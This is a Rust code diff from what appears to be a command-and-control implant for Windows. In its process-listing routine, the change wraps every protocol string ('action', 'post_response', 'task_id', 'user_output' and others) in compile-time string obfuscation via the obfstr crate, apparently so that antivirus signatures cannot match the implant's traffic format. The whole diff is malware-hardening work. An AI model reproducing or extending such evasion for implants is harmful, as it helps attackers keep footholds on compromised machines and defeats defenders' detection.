@@ -9,6 +9,7 @@ use winapi::shared::{
     minwindef::DWORD,
 };
 use serde_json::Value;
+use obfstr::obfstr;
 
 const SystemProcessInformation: u32 = 5;
 const BUFFER_SIZE: usize = 0x100000;
@@ -151,14 +152,14 @@ pub fn list_processes(task: &Value) -> Result<(), Box<dyn std::error::Error>>  {
     crate::helpers::churn(output.as_str());
 
     let response_json = serde_json::json!({
-        "action": "post_response",
-        "responses": [
+        obfstr!("action"): obfstr!("post_response"),
+        obfstr!("responses"): [
             {
-                "task_id": task.get("id").unwrap().as_str().unwrap(),
-                "user_output": output,
-                "timestamp": task.get("timestamp").unwrap().as_f64().unwrap(),
-                "status": "success",
-                "completed": true,
+                obfstr!("task_id"): task.get("id").unwrap().as_str().unwrap(),
+                obfstr!("user_output"): output,
+                obfstr!("timestamp"): task.get(obfstr!("timestamp")).unwrap().as_f64().unwrap(),
+                obfstr!("status"): obfstr!("success"),
+                obfstr!("completed"): true,
             }
         ]
     });
